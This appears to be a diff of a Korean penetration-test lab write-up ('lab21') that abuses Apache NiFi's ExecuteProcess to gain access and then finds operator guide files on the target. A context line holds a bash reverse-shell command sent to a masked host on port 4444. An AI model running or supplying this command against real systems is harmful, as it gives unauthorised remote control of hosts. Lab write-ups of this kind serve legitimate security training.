@@ -2,7 +2,7 @@
 publish: true
 title: 모의해킹 보고서 - lab21
 created: 2026-11-19
-modified: 2026-11-19T19:52:10.572Z
+modified: 2026-11-19T19:56:59.817Z
 published: 2026-11-19
 date: 2026-11-19
 tags:
@@ -91,7 +91,9 @@ Command Arguments: -c,bash -i >& /dev/tcp/[MASK]/4444 0>&1
 Argument Delimiter: ,
 ```
 
-설정에서 리버스쉘을 넣어주고 실행을 해준다.
+![[00. Setting/00. 첨부파일/Pasted image 20261120045404.png]]
+
+설정에서 리버스쉘을 넣어주고 `LogAttribute`에 연결 후 실행을 해준다.
 
 `Argument Delimiter`: NiFi가 Command Arguments를 여러 인수로 나눌 때 쓰는 문자. 홑따옴표를 써도 됨.
 
@@ -116,7 +118,7 @@ Argument Delimiter: ,
 
 ![[00. Setting/00. 첨부파일/Pasted image 20261119091644.png]]
 
-`operator`의 홈에 'control system diagram.png', 'Operator Control & Safty Guide.pdf' 파일이 있다. 운영 가이드인 것 같으니 읽어보자.
+`operator`의 홈에 `'control system diagram.png'`, `'Operator Control & Safty Guide.pdf'` 파일이 있다. 운영 가이드인 것 같으니 읽어보자.
 
 ![[00. Setting/00. 첨부파일/Pasted image 20261119092954.png]]
 ![[00. Setting/00. 첨부파일/Pasted image 20261119093021.png]]
